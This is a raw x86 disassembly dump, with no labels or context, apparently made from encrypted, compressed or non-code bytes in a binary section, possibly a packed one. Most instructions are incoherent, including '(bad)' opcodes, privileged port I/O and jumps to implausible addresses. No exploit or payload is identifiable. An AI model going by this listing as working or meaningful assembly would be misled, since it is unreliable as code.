  41dff2:	jo     0x41dfc6
  41dff4:	lods   al,BYTE PTR ds:[esi]
  41dff5:	mov    ebx,0xe5b5c595
  41dffa:	mov    cl,0x92
  41dffc:	sahf   
  41dffd:	mov    ds:0x5ec723e5,eax
  41e002:	lock jns 0x41dfb4
  41e005:	test   BYTE PTR [ebx-0x62],dl
  41e008:	xchg   ebp,eax
  41e009:	(bad)  
  41e00a:	enter  0x2aca,0xc6
  41e00e:	mov    esp,0xce2a7047
  41e013:	mov    al,ds:0xdf56346
  41e018:	xor    esi,eax
  41e01a:	mov    ds:0x3c21cc1b,eax
  41e01f:	mov    dl,0x9b
  41e021:	ror    BYTE PTR ds:0xb343c544,cl
  41e027:	inc    eax
  41e028:	outs   dx,BYTE PTR ds:[esi]
  41e029:	shr    BYTE PTR [edx-0x6],cl
  41e02c:	jbe    0x41dfdd
  41e02e:	sub    al,0x75
  41e030:	mov    bl,0x70
  41e032:	call   0x86329c07
  41e037:	imul   edi,esp,0x5655c257
  41e03d:	mov    ah,0x48
  41e03f:	adc    DWORD PTR [ecx+0x508ab828],edx
  41e045:	fneni(8087 only) 
  41e047:	aas    
  41e048:	(bad)  
  41e049:	fiadd  WORD PTR [eax]
  41e04b:	ret    0x1fc3
  41e04e:	pop    edi
  41e04f:	(bad)  
  41e050:	lods   eax,DWORD PTR ds:[esi]
  41e051:	mov    ds:0xcea63f49,al
  41e056:	push   edi
  41e057:	icebp  
  41e058:	or     DWORD PTR [esi+0x1a],esp
  41e05b:	cmp    bl,BYTE PTR [ebx-0x64]
  41e05e:	pop    ecx
  41e05f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e060:	mov    ah,0xf7
  41e062:	popa   
  41e063:	ror    ebx,1
  41e065:	mov    ds:0x294789ee,eax
  41e06a:	mov    ds:0x13b7414a,eax
  41e06f:	out    0xce,eax
  41e071:	mov    ecx,0x7472aaf6
  41e076:	outs   dx,BYTE PTR ds:[esi]
  41e077:	jmp    0xdfb0:0x44401c7e
  41e07e:	xor    eax,0xc1e234c2
  41e083:	iret   
  41e084:	lods   al,BYTE PTR ds:[esi]
  41e085:	test   eax,0x81931497
  41e08a:	jp     0x41e039
  41e08c:	adc    ebp,ebx
  41e08e:	cs push es
  41e090:	addr16 dec eax
  41e092:	test   ebp,ecx
  41e094:	push   ebp
  41e095:	inc    esp
  41e096:	pop    es
  41e097:	cmc    
  41e098:	pop    ebx
  41e099:	rol    DWORD PTR [ecx],1
  41e09b:	add    ch,bh
  41e09d:	addr16 loope 0x41e073
  41e0a0:	leavew 
  41e0a2:	xor    dh,BYTE PTR [esi-0x6ee43c76]
  41e0a8:	jmp    0xa89ef99b
  41e0ad:	adc    eax,0xd71d122a
  41e0b2:	ret    
  41e0b3:	jne    0x41e068
  41e0b5:	cmp    edi,0xffffffc7
  41e0b8:	loop   0x41e101
  41e0ba:	stc    
  41e0bb:	mov    ebx,DWORD PTR [ecx]
  41e0bd:	pop    esi
  41e0be:	jno    0x41e045
  41e0c0:	icebp  
  41e0c1:	mov    edx,0xf1e9105f
  41e0c6:	cmc    
  41e0c7:	or     BYTE PTR ds:0x1274ee30,0xf3
  41e0cf:	and    edx,DWORD PTR [ecx+0x42dd3f0a]
  41e0d5:	xchg   edi,eax
  41e0d6:	xor    DWORD PTR [esp+ebp*1+0x33c731ff],ecx
  41e0dd:	xchg   esi,eax
  41e0de:	fldcw  WORD PTR [edi+0x136184c3]
  41e0e4:	ror    ch,1
  41e0e6:	fist   DWORD PTR [ecx]
  41e0e8:	mov    eax,0xd1e3cd46
  41e0ed:	not    DWORD PTR ds:0x96b026b
  41e0f3:	aas    
  41e0f4:	icebp  
  41e0f5:	inc    esp
  41e0f6:	lods   al,BYTE PTR ds:[esi]
  41e0f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0f8:	mov    eax,0xa8432b1f
  41e0fd:	push   0xcc5241c1
  41e102:	icebp  
  41e103:	cmp    al,0x2a
  41e105:	repnz imul ebp,DWORD PTR [edi],0xffffffb6
  41e109:	inc    eax
  41e10a:	and    DWORD PTR [edx-0x46f95765],ebp
  41e110:	pop    edx
  41e111:	shl    DWORD PTR [esi],cl
  41e113:	lock add ah,BYTE PTR [esi-0x60]
  41e117:	cmp    BYTE PTR ds:0xaa330f15,0x11
  41e11e:	cmp    BYTE PTR [ecx],0x12
  41e121:	jmp    0x41e188
  41e123:	jmp    0x33b9305b
  41e128:	xor    eax,0xa559a226
  41e12d:	fadd   DWORD PTR [esi+0x2d3d9708]
  41e133:	loopne 0x41e146
  41e135:	lds    edx,FWORD PTR [ebx]
  41e137:	fdivr  QWORD PTR [esi+edx*4-0x26]
  41e13b:	dec    BYTE PTR [ecx]
  41e13d:	(bad)  
  41e13e:	clc    
  41e13f:	cld    
  41e140:	xchg   ebp,eax
  41e141:	pop    ecx
  41e142:	sar    BYTE PTR [edi],0x39
  41e145:	mov    DWORD PTR [edi],eax
  41e147:	idiv   DWORD PTR [ebx-0x4c2b3b4a]
  41e14d:	mov    bh,0x2b
  41e14f:	mov    dh,0x72
  41e151:	add    DWORD PTR [esi+0x27],ebx
  41e154:	xchg   ebp,eax
  41e155:	loope  0x41e187
  41e157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e158:	push   0xffffffc2
  41e15a:	into   
  41e15b:	out    dx,al
  41e15c:	loope  0x41e150
  41e15e:	mov    ah,0x2f
  41e160:	sub    cl,BYTE PTR [esi-0x1b624485]
  41e166:	je     0x41e195
  41e168:	ins    BYTE PTR es:[edi],dx
  41e169:	push   eax
  41e16a:	sbb    dh,al
  41e16c:	test   DWORD PTR [ebp+ebp*2-0x69d5e17b],esp
  41e173:	jae    0x41e10d
  41e175:	icebp  
  41e176:	in     al,dx
  41e177:	add    eax,0x2de0afc7
  41e17c:	daa    
  41e17d:	and    eax,0x1b1dba2c
  41e182:	push   edx
  41e183:	cdq    
  41e184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e185:	add    eax,0xb618f995
  41e18a:	push   0xffffff95
  41e18c:	cld    
  41e18d:	data16 int3 
  41e18f:	iret   
  41e190:	retf   0xa1c3
  41e193:	cld    
  41e194:	cmp    BYTE PTR [ebp+0xb],cl
  41e197:	lahf   
  41e198:	add    ecx,esp
  41e19a:	mov    edx,0x42aada6c
  41e19f:	fbld   TBYTE PTR [eax-0x51]
  41e1a2:	loope  0x41e15c
  41e1a4:	inc    esp
  41e1a5:	in     eax,0xc0
  41e1a7:	stos   DWORD PTR es:[edi],eax
  41e1a8:	push   edi
  41e1a9:	shl    DWORD PTR [ebx],1
  41e1ab:	mov    ds:0xef4eeafe,al
  41e1b0:	pop    ebx
  41e1b1:	rcr    BYTE PTR [esi-0x2b],0xd0
  41e1b5:	dec    edx
  41e1b6:	inc    edx
  41e1b7:	pop    es
  41e1b8:	push   cs
  41e1b9:	loop   0x41e1ad
  41e1bb:	xor    eax,0x4163d420
  41e1c0:	mov    dh,0xe4
  41e1c2:	(bad)  
  41e1c3:	adc    DWORD PTR [edi+0x48],eax
  41e1c6:	(bad)  
  41e1c7:	call   0xd306:0xb627660f
  41e1ce:	fs ret 0x6b4a
  41e1d2:	popf   
  41e1d3:	push   0x72d0eeda
  41e1d8:	mov    dh,0x78
  41e1da:	gs push es
  41e1dc:	stos   BYTE PTR es:[edi],al
  41e1dd:	int3   
  41e1de:	mov    edx,0x8f2c5916
  41e1e3:	sar    DWORD PTR [ebp+edi*1-0x675fe101],1
  41e1ea:	jo     0x41e198
  41e1ec:	cmc    
  41e1ed:	sbb    BYTE PTR [esi+0x5f4ec077],0x3b
  41e1f4:	mov    edx,0xa4a6c4be
  41e1f9:	jnp    0x41e261
  41e1fb:	mov    ecx,ecx
  41e1fd:	das    
  41e1fe:	mov    esp,0x5c84051d
  41e203:	(bad)  
  41e204:	ror    BYTE PTR [eax-0x4e],cl
  41e207:	ja     0x41e285
  41e209:	jb     0x41e21c
  41e20b:	jg     0x41e1a5
  41e20d:	sbb    al,0x46
  41e20f:	(bad)  
  41e210:	cwde   
  41e211:	fs js  0x41e1fb
  41e214:	call   0xab94533
  41e219:	xor    eax,0x867f860
  41e21e:	add    ch,BYTE PTR [esi-0x5a1a8990]
  41e224:	mov    esi,0x85999455
  41e229:	or     edx,esi
  41e22b:	call   0xe5b2cf3b
  41e230:	or     DWORD PTR [ebp-0x56],esp
  41e233:	fwait
  41e234:	je     0x41e1cd
  41e236:	in     al,0xe
  41e238:	adc    al,0xd5
  41e23a:	daa    
  41e23b:	imul   ecx,DWORD PTR [ebx+esi*1+0x78],0xef1bc6bc
  41e243:	bound  eax,QWORD PTR [edi-0x853c32b]
  41e249:	sbb    ecx,DWORD PTR [edx]
  41e24b:	inc    edx
  41e24c:	retf   0xa9b5
  41e24f:	mov    esi,0xdc8d7783
  41e254:	mov    al,0xbe
  41e256:	popa   
  41e257:	pushf  
  41e258:	add    ecx,edi
  41e25a:	pop    esp
  41e25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e25c:	mov    edi,DWORD PTR [ebp+eiz*4+0x7e44fc04]
  41e263:	cmp    DWORD PTR [ecx-0x13],ebx
  41e266:	xchg   esp,eax
  41e267:	sti    
  41e268:	push   esp
  41e269:	xlat   BYTE PTR ds:[ebx]
  41e26a:	adc    eax,0x57463384
  41e26f:	in     al,dx
  41e270:	in     al,0x70
  41e272:	or     edi,DWORD PTR [edi+0x61]
  41e275:	jecxz  0x41e241
  41e277:	call   0x20ada915
  41e27c:	and    DWORD PTR [esi+0x55],0x49
  41e280:	cmp    ebp,DWORD PTR [eax+0x50d5c0a4]
  41e286:	test   BYTE PTR [ebx],cl
  41e288:	xchg   esp,eax
  41e289:	int    0x38
  41e28b:	adc    edx,DWORD PTR [ebp-0x375860d]
  41e291:	and    ebx,DWORD PTR [eax-0x6f75da84]
  41e297:	es jle 0x41e2b7
  41e29a:	(bad)  
  41e29b:	mov    eax,0x2385312
  41e2a0:	sub    esp,DWORD PTR [ebx-0x534bf041]
  41e2a6:	pop    es
  41e2a7:	popa   
  41e2a8:	sbb    edi,ebp
  41e2aa:	sub    al,BYTE PTR [eax-0x40e4cc8]
  41e2b0:	push   es
  41e2b1:	mov    ebx,0x81b9ad14
  41e2b6:	dec    ebx
  41e2b7:	jmp    0x5d362588
  41e2bc:	call   0xc82d8df3
  41e2c1:	shr    esi,0xbc
  41e2c4:	inc    eax
  41e2c5:	xchg   edx,eax
  41e2c6:	push   ecx
  41e2c7:	xor    esi,esp
  41e2c9:	scas   eax,DWORD PTR es:[edi]
  41e2ca:	addr16 int3 
  41e2cc:	jmp    0x41e2db
  41e2ce:	adc    DWORD PTR [edx-0x178b7741],esp
  41e2d4:	mov    ?,WORD PTR ds:0x293d08c4
  41e2da:	add    DWORD PTR [ecx],ebx
  41e2dc:	into   
  41e2dd:	es mov ebx,0x44c2b90d
  41e2e3:	out    0x82,al
  41e2e5:	push   ds
  41e2e6:	in     eax,0xcc
  41e2e8:	mov    al,ds:0x436095d4
  41e2ed:	dec    edi
  41e2ee:	jo     0x41e2fe
  41e2f0:	jp     0x41e2ba
  41e2f2:	cmp    eax,0x9d93bf2f
  41e2f7:	inc    ebp
  41e2f8:	lock lods al,BYTE PTR ds:[esi]
  41e2fa:	fs pusha 
  41e2fc:	pop    es
  41e2fd:	in     eax,0xb1
  41e2ff:	inc    ecx
  41e300:	jmp    0x5e1102fa
  41e305:	imul   eax,DWORD PTR [ebx-0x32e50092],0x36f81b12
  41e30f:	add    bh,cl
  41e311:	adc    DWORD PTR [ecx],ecx
  41e313:	into   
  41e314:	stos   DWORD PTR es:[edi],eax
  41e315:	jmp    0xe549c3be
  41e31a:	push   0xffffff91
  41e31c:	enter  0x50f3,0x34
  41e320:	mov    ds:0xbcd40d,al
  41e325:	cmp    eax,0xa466c154
  41e32a:	push   ds
  41e32b:	xchg   edx,eax
  41e32c:	and    BYTE PTR [edx],bh
  41e32e:	fs xchg ebx,eax
  41e330:	push   eax
  41e331:	(bad)  
  41e332:	call   FWORD PTR [ebx-0x38]
  41e335:	add    ebx,DWORD PTR [esi+0x3b]
  41e338:	nop
  41e339:	inc    edi
  41e33a:	or     bh,BYTE PTR [edx-0x2a]
  41e33d:	pop    edi
  41e33e:	sub    esi,ecx
  41e340:	sbb    DWORD PTR [edx],edi
  41e342:	dec    ebx
  41e343:	outs   dx,BYTE PTR ds:[esi]
  41e344:	fdiv   QWORD PTR [edx+0x7be43c92]
  41e34a:	push   cs
  41e34b:	ins    DWORD PTR es:[edi],dx
  41e34c:	pop    edi
  41e34d:	inc    esp
  41e34e:	mov    ecx,0xbfa80f1a
  41e353:	xchg   ebp,eax
  41e354:	xor    BYTE PTR [edi+eiz*8],bh
  41e357:	adc    DWORD PTR [ecx+0x61],edi
  41e35a:	lock in al,0x8f
  41e35d:	sub    DWORD PTR [eax-0x7a],ecx
  41e360:	pop    edx
  41e361:	pop    esi
  41e362:	leave  
  41e363:	mov    bl,0x83
  41e365:	mov    cr7,edx
  41e368:	int    0xd5
  41e36a:	jg     0x41e3ad
  41e36c:	jecxz  0x41e317
  41e36e:	loop   0x41e34d
  41e370:	mov    BYTE PTR [edx],0x86
  41e373:	pop    eax
  41e374:	inc    esi
  41e375:	xchg   esi,eax
  41e376:	xchg   esi,eax
  41e377:	hlt    
  41e378:	inc    esi
  41e379:	(bad)  
  41e37a:	mov    ss:0x1b30c7a,eax
  41e380:	mov    ebp,DWORD PTR [eax+ebx*8-0x3586acd3]
  41e387:	inc    edi
  41e388:	pop    esi
  41e389:	pop    ecx
  41e38a:	popa   
  41e38b:	stos   DWORD PTR es:[edi],eax
  41e38c:	out    dx,al
  41e38d:	pop    es
  41e38e:	pop    ebp
  41e38f:	cmp    eax,0xf89ddbd3
  41e394:	dec    ecx
  41e395:	xchg   edx,eax
  41e396:	pop    eax
  41e397:	xlat   BYTE PTR ds:[ebx]
  41e398:	mov    al,0xcf
  41e39a:	std    
  41e39b:	in     al,dx
  41e39c:	lods   eax,DWORD PTR ds:[esi]
  41e39d:	xchg   BYTE PTR [ecx+0x645d7634],ch
  41e3a3:	jl     0x41e41a
  41e3a5:	inc    DWORD PTR [ebx-0x22]
  41e3a8:	call   0x208e4a27
  41e3ad:	mov    dh,0x62
  41e3af:	stos   DWORD PTR es:[edi],eax
  41e3b0:	ret    
  41e3b1:	loope  0x41e38b
  41e3b3:	fmulp  st(1),st
  41e3b5:	lock sub eax,0xd755c485
  41e3bb:	les    edi,FWORD PTR [ebx-0x310fddb0]
  41e3c1:	xchg   ebp,eax
  41e3c2:	pop    esp
  41e3c3:	mov    edi,0xc8055135
  41e3c8:	or     ch,dh
  41e3ca:	xchg   esp,eax
  41e3cb:	or     dh,BYTE PTR ds:0x3ec06bf0
  41e3d1:	jmp    FWORD PTR [ebx]
  41e3d3:	sbb    edi,DWORD PTR [eax+0x420d2d1]
  41e3d9:	enter  0x8cb9,0x2
  41e3dd:	add    eax,0x9c7ea60b
  41e3e2:	repnz pop ecx
  41e3e4:	push   ss
  41e3e5:	jbe    0x41e3c6
  41e3e7:	rol    BYTE PTR [edx],cl
  41e3e9:	test   eax,0x3ad04aea
  41e3ee:	repz shr bh,0xa
  41e3f2:	dec    ecx
  41e3f3:	cmp    cl,0x35
  41e3f6:	cdq    
  41e3f7:	mov    ah,0xd1
  41e3f9:	addr16 inc eax
  41e3fb:	sub    eax,0xc7599236
  41e400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e401:	pop    DWORD PTR [ebx]
  41e403:	jge    0x41e3ab
  41e405:	lods   eax,DWORD PTR ds:[esi]
  41e406:	test   al,0x84
  41e408:	or     ah,BYTE PTR [ecx]
  41e40a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e40b:	push   0x5d1a1b5b
  41e410:	pop    edx
  41e411:	lods   eax,DWORD PTR ds:[esi]
  41e412:	stc    
  41e413:	scas   al,BYTE PTR es:[edi]
  41e414:	(bad)  
  41e416:	rol    bl,cl
  41e418:	adc    BYTE PTR [edx+ebp*4+0x2b],0x6d
  41e41d:	add    al,0x6f
  41e41f:	adc    eax,0xd3966338
  41e424:	or     al,0x18
  41e426:	or     DWORD PTR [ebp+0x6f],ebp
  41e429:	xor    al,0x9d
  41e42b:	push   esp
  41e42c:	test   al,0xa9
  41e42e:	ins    DWORD PTR es:[edi],dx
  41e42f:	dec    edx
  41e430:	pusha  
  41e431:	lea    esp,[esi+eiz*4+0x7c]
  41e435:	jle    0x41e489
  41e437:	dec    esi
  41e438:	jo     0x41e3ce
  41e43a:	das    
  41e43b:	ficom  DWORD PTR [esi-0x70eb4c51]
  41e441:	jb     0x41e3c4
  41e443:	mov    edx,0xcdb46896
  41e448:	out    dx,eax
  41e449:	imul   ebp,ecx,0x92765ba6
  41e44f:	in     al,dx
  41e450:	(bad)  
  41e453:	sub    al,0x21
  41e455:	fdiv   QWORD PTR [esi-0x60]
  41e458:	inc    ecx
  41e459:	(bad)  
  41e45a:	pop    ebx
  41e45b:	mov    edx,0xf5b2ead8
  41e460:	pop    ds
  41e461:	inc    ebp
  41e462:	into   
  41e463:	push   ds
  41e464:	das    
  41e465:	cmp    BYTE PTR [edi],0x36
  41e468:	xchg   ebx,eax
  41e469:	(bad)  
  41e46a:	add    eax,0x4e309d2f
  41e46f:	mov    eax,ds:0xebef20b9
  41e474:	inc    edi
  41e475:	aam    0xfe
  41e477:	call   0x38e13db
  41e47c:	test   BYTE PTR [eax],ah
  41e47e:	mov    esp,0xf95c9fe7
  41e483:	fnstcw WORD PTR [ebx]
  41e485:	repz (bad) 
  41e487:	sub    al,0xad
  41e489:	pushf  
  41e48a:	lods   eax,DWORD PTR ds:[esi]
  41e48b:	mov    bh,0x94
  41e48d:	pop    ebp
  41e48e:	mov    bl,0x6e
  41e490:	(bad)  
  41e492:	cs push edi
  41e494:	pop    ebx
  41e495:	pop    eax
  41e496:	pextrw esp,(bad),0xc5
  41e498:	and    ecx,eax
  41e49a:	into   
  41e49b:	dec    ebp
  41e49c:	pmullw mm0,QWORD PTR [eax+edx*1-0x63]
  41e4a1:	xor    ebp,DWORD PTR [eax+0x72904900]
  41e4a7:	mov    cl,BYTE PTR [edx+0x55]
  41e4aa:	outs   dx,DWORD PTR ds:[esi]
  41e4ab:	dec    eax
  41e4ac:	xor    al,0xdf
  41e4ae:	ins    BYTE PTR es:[edi],dx
  41e4af:	and    BYTE PTR ds:[edi],cl
  41e4b2:	test   eax,0xbf9e680
  41e4b7:	ror    BYTE PTR [edi],cl
  41e4b9:	jae    0x41e499
  41e4bb:	mov    al,ds:0xfb896e0
  41e4c0:	retf   0xd01b
  41e4c3:	add    al,0xaf
  41e4c5:	mov    BYTE PTR [edi+edi*8-0x6cd6e5eb],ch
  41e4cc:	imul   edi,DWORD PTR [eax-0x2066d126],0xa86dec90
  41e4d6:	mov    esi,0x355b74ce
  41e4db:	mov    bh,0x6a
  41e4dd:	cwde   
  41e4de:	cmp    dl,bh
  41e4e0:	jo     0x41e475
  41e4e2:	enter  0x7e7c,0x75
  41e4e6:	pop    ds
  41e4e7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e4e9:	pop    edi
  41e4ea:	or     ebp,DWORD PTR [edi+edi*1]
  41e4ed:	es call 0x2d53:0x5cb199ad
  41e4f5:	push   edi
  41e4f6:	int    0x95
  41e4f8:	adc    ah,bl
  41e4fa:	cld    
  41e4fb:	cmc    
  41e4fc:	fs pushf 
  41e4fe:	jg     0x41e570
  41e500:	sub    BYTE PTR [eax-0x20bac682],bh
  41e506:	inc    esp
  41e507:	retf   
  41e508:	scas   eax,DWORD PTR es:[edi]
  41e509:	fisubr WORD PTR [ecx]
  41e50b:	(bad)
  41e50e:	lds    ebp,FWORD PTR [eax+0x700943fc]
  41e514:	cmc    
  41e515:	lods   eax,DWORD PTR ds:[esi]
  41e516:	push   es
  41e517:	test   eax,0x357df1e8
  41e51c:	stos   DWORD PTR es:[edi],eax
  41e51d:	mov    ebx,0xa13edcba
  41e522:	sbb    bl,ah
  41e524:	cmp    al,0xb9
  41e526:	push   ss
  41e527:	loop   0x41e4c9
  41e529:	pop    ds
  41e52a:	push   ebp
  41e52b:	xor    DWORD PTR [edx+0x2],edi
  41e52e:	cld    
  41e52f:	daa    
  41e530:	mov    ds:0xe61f2306,eax
  41e535:	cmp    BYTE PTR [ecx-0x6d],dh
  41e538:	stos   DWORD PTR es:[edi],eax
  41e539:	inc    edi
  41e53a:	hlt    
  41e53b:	and    ecx,ecx
  41e53d:	bound  ebp,QWORD PTR [edi]
  41e53f:	fwait
  41e540:	cs mov ebx,0x9540db45
  41e546:	xchg   ebp,eax
  41e547:	mov    ds:0x46b3488e,eax
  41e54c:	(bad)  
  41e54d:	sub    esp,ebx
  41e54f:	hlt    
  41e550:	cmp    DWORD PTR [edi+ebx*8-0x5f],ebx
  41e554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e555:	retf   
  41e556:	mov    eax,ds:0x266c7dee
  41e55b:	inc    esi
  41e55c:	jmp    0xac36dc75
  41e561:	xor    eax,0x596e8f14
  41e566:	or     al,0xe9
  41e568:	sbb    BYTE PTR [eax],0x49
  41e56b:	cmp    BYTE PTR [ebp+0x165336a4],bl
  41e571:	dec    ebx
  41e572:	aad    0xa4
  41e574:	jg     0x41e579
  41e576:	push   esp
  41e577:	jbe    0x41e52e
  41e579:	jg     0x41e4fe
  41e57b:	push   ebp
  41e57c:	into   
  41e57d:	test   ecx,edx
  41e57f:	mov    ds,edi
  41e581:	cmp    DWORD PTR [eax+0x1d61d422],esi
  41e587:	pop    ebx
  41e588:	lea    ebp,[ebp+esi*1+0x1ccb92cb]
  41e58f:	sbb    ebx,DWORD PTR [esi+0x2e]
  41e592:	pop    ecx
  41e593:	popa   
  41e594:	repnz lods al,BYTE PTR ds:[esi]
  41e596:	or     eax,ebp
  41e598:	clc    
  41e599:	imul   esi,DWORD PTR [ebx-0xd],0x5261ef6d
  41e5a0:	mov    BYTE PTR [ecx+0x4435178a],ch
  41e5a6:	aad    0xf2
  41e5a8:	inc    ebp
  41e5a9:	rcl    BYTE PTR [ecx+0x4b],0x2a
  41e5ad:	mov    eax,ds:0x49635afd
  41e5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b3:	int    0x73
  41e5b5:	fnstcw WORD PTR ds:0xfe72ddda
  41e5bb:	mov    ebx,0x501c8b3c
  41e5c0:	pusha  
  41e5c1:	gs or  edx,ebp
  41e5c4:	mov    eax,0x9bc9d5ce
  41e5c9:	aaa    
  41e5ca:	popa   
  41e5cb:	jbe    0x41e54e
  41e5cd:	ror    BYTE PTR [ebx+0x7f],1
  41e5d0:	pop    ebx
  41e5d1:	outs   dx,BYTE PTR ds:[esi]
  41e5d2:	mov    cl,0xfa
  41e5d4:	call   0x4363:0x5c52c9bd
  41e5db:	mov    bh,0x80
  41e5dd:	in     eax,0x92
  41e5df:	xor    esp,0x428363d3
  41e5e5:	loop   0x41e643
  41e5e7:	stos   BYTE PTR es:[edi],al
  41e5e8:	xor    eax,0xea08620e
  41e5ed:	and    dh,BYTE PTR [ebx+0x6]
  41e5f0:	xor    cl,BYTE PTR [edx+0x5d]
  41e5f3:	mov    esi,ds
  41e5f5:	jne    0x41e57a
  41e5f7:	or     BYTE PTR [edi-0x24],ch
  41e5fa:	jle    0x41e5dc
  41e5fc:	push   eax
  41e5fd:	and    esi,edx
  41e5ff:	push   edi
  41e600:	inc    eax
  41e601:	and    ebp,DWORD PTR [edi+0x26b06bed]
  41e607:	cmp    DWORD PTR [ecx-0x34ea86b7],ebp
  41e60d:	xlat   BYTE PTR ds:[ebx]
  41e60e:	mov    ds,WORD PTR [ebx-0x6c]
  41e611:	jge    0x41e596
  41e613:	push   ss
  41e614:	push   es
  41e615:	and    al,0x7e
  41e617:	pop    esp
  41e618:	and    dl,bl
  41e61a:	and    BYTE PTR [edi],bl
  41e61c:	mov    ecx,0xa025f875
  41e621:	xor    al,0x95
  41e623:	out    0x51,eax
  41e625:	sbb    eax,0x7dc537d4
  41e62a:	mov    ah,0x16
  41e62c:	mov    BYTE PTR [eax+0xd],bl
  41e62f:	adc    BYTE PTR cs:[eax],bl
  41e632:	add    bl,bl
  41e634:	icebp  
  41e635:	push   0x3398fe60
  41e63a:	int3   
  41e63b:	(bad)  
  41e63d:	mov    bh,0x87
  41e63f:	ficom  WORD PTR [eax-0x49]
  41e642:	mov    cl,0xad
  41e644:	test   eax,0xdc007d82
  41e649:	shl    dl,cl
  41e64b:	rcr    BYTE PTR [esi-0x69],cl
  41e64e:	ret    
  41e64f:	mov    ch,0xc4
  41e651:	push   ebx
  41e652:	test   DWORD PTR [esi-0x41a2d0c],ebp
  41e658:	jl     0x41e661
  41e65a:	iret   
  41e65b:	cmp    eax,0x6379ddc3
  41e660:	pop    ebp
  41e661:	xchg   ebx,eax
  41e662:	dec    ebx
  41e663:	int    0x6a
  41e665:	lds    ebx,FWORD PTR [eax]
  41e667:	adc    edx,eax
  41e669:	push   es
  41e66a:	sub    eax,0x654dbde
  41e66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e670:	push   esp
  41e671:	pop    ds
  41e672:	inc    ebp
  41e673:	adc    eax,0x76e7d171
  41e678:	sahf   
  41e679:	fidivr DWORD PTR [esi-0x50]
  41e67c:	ror    al,1
  41e67e:	mov    ecx,0x97bf7f51
  41e683:	or     BYTE PTR [edi],0x88
  41e686:	enter  0x244f,0x19
  41e68a:	sbb    DWORD PTR [ecx-0x17],edi
  41e68d:	imul   esp,esp,0xffffffcd
  41e690:	sub    DWORD PTR [edx+0xc74c27d],esp
  41e696:	sar    ch,0xff
  41e699:	out    0x68,eax
  41e69b:	xchg   ecx,eax
  41e69c:	or     BYTE PTR ds:0x2824f4e8,dh
  41e6a2:	daa    
  41e6a3:	cmp    DWORD PTR [eax-0x803814f],0xdbb480d1
  41e6ad:	jecxz  0x41e681
  41e6af:	jge    0x41e72d
  41e6b1:	fist   DWORD PTR ds:0xabb5dc83
  41e6b7:	nop
  41e6b8:	int3   
  41e6b9:	pop    edi
  41e6ba:	loop   0x41e6df
  41e6bc:	popa   
  41e6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6be:	mov    eax,0xe6d40f3d
  41e6c3:	jg     0x41e731
  41e6c5:	cmc    
  41e6c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6c7:	fldenv [ebx-0x60b1d239]
  41e6cd:	ret    
  41e6ce:	push   ecx
  41e6cf:	fidiv  DWORD PTR ds:0x3d7892cb
  41e6d5:	mov    bh,0x71
  41e6d7:	inc    esp
  41e6d8:	dec    eax
  41e6d9:	add    eax,0xf7d2df99
  41e6de:	cmp    ebx,edi
  41e6e0:	cld    
  41e6e1:	inc    ebp
  41e6e2:	cmc    
  41e6e3:	and    al,0x97
  41e6e5:	cs jg  0x41e701
  41e6e8:	mov    cl,ch
  41e6ea:	lea    esi,[edx-0x6a073d48]
  41e6f0:	xchg   ebx,eax
  41e6f1:	test   eax,0xf63658c9
  41e6f6:	ins    BYTE PTR es:[edi],dx
  41e6f7:	push   0xf04eec68
  41e6fc:	jecxz  0x41e6aa
  41e6fe:	push   ds
  41e6ff:	addr16 mov ch,0xbf
  41e702:	gs push 0x1d
  41e705:	cmp    esi,edx
  41e707:	popa   
  41e708:	pcmpgtw mm6,QWORD PTR [esi+0xf]
  41e70c:	inc    edx
  41e70d:	jns    0x41e6f5
  41e70f:	stc    
  41e710:	mov    ch,0x9f
  41e712:	call   0x77b4:0x914fd691
  41e719:	mov    bh,0x22
  41e71b:	jne    0x41e6f4
  41e71d:	inc    ebx
  41e71e:	xchg   edi,eax
  41e71f:	test   eax,0xbf6cbaf
  41e724:	mov    ch,BYTE PTR [ebp+0x7ae1d8b3]
  41e72a:	aas    
  41e72b:	shr    DWORD PTR [ebx+0x1d],1
  41e72e:	fmul   DWORD PTR [ecx+0x3]
  41e731:	rcr    DWORD PTR [edx-0x7],1
  41e734:	jae    0x41e77e
  41e736:	mov    es,WORD PTR [esi]
  41e738:	lahf   
  41e739:	xchg   edi,eax
  41e73a:	xor    dh,dh
  41e73c:	jo     0x41e789
  41e73e:	mov    ah,0x47
  41e740:	add    eax,0x7db6138b
  41e745:	mov    BYTE PTR [esi+0x194096a4],0xb5
  41e74c:	mov    DWORD PTR ds:0xca675a3e,edi
  41e752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e753:	xchg   esp,eax
  41e754:	mov    dl,0x93
  41e756:	pop    ebp
  41e757:	xor    ebx,esp
  41e759:	push   ds
  41e75a:	inc    eax
  41e75b:	jmp    0xebd93431
  41e760:	div    bl
  41e762:	popa   
  41e763:	sub    BYTE PTR [ebp-0x3bbc92d3],dh
  41e769:	and    DWORD PTR [ecx],0xffffffa6
  41e76c:	xchg   ebp,eax
  41e76d:	mul    BYTE PTR [ebx+0x4069f92f]
  41e773:	(bad)  
  41e774:	retf   0x3cc5
  41e777:	adc    bh,bl
  41e779:	cmp    ch,BYTE PTR [ecx]
  41e77b:	ins    DWORD PTR es:[edi],dx
  41e77c:	mov    cl,0x7b
  41e77e:	pusha  
  41e77f:	push   0xb7986753
  41e784:	lea    eax,[ebx+0x4d]
  41e787:	pop    esi
  41e788:	dec    eax
  41e789:	cmp    DWORD PTR [ebx],0x76c7b116
  41e78f:	enter  0x3ebc,0xdc
  41e793:	xchg   esp,eax
  41e794:	sub    al,0x2d
  41e796:	jp     0x41e736
  41e798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e799:	lea    edx,[esp+esi*8]
  41e79c:	push   ds
